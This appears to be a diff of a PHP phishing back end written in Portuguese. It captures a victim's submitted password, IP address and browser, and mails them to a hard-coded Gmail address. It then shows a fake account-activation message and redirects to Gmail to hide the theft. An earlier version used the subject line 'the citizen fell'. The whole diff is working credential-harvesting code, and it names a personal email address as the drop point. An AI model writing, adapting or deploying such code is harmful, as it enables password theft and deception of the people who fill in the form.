@@ -9,14 +9,12 @@ $horario = date('h:i:s');
 $pass = $_POST['password'];
 
 $vardokct = "IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass";
+$nome="Teste";
+$email="yslmarques@gmail.com";
 
-// O remetente deve ser um e-mail do seu domínio conforme determina a RFC 822.
-// O return-path deve ser ser o mesmo e-mail do remetente.
-$headers = "MIME-Version: 1.1\r\n";
-$headers .= "Content-type: text/plain; charset=UTF-8\r\n";
-$headers .= "From: yslmarques@gmail.com\r\n"; // remetente
-$headers .= "Return-Path: yslmarques@gmail.com\r\n"; // return-path
-$envio = mail("yslmarques@gmail.com", "O cidadão caiu", $vardokct, $headers);
+mail (
+    "yslmarques@gmail.com", //Endereço que vai receber a mensagem
+    "Mensagem: $vardokct", "FROM$nome:<$email>");
 
 echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
 header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");
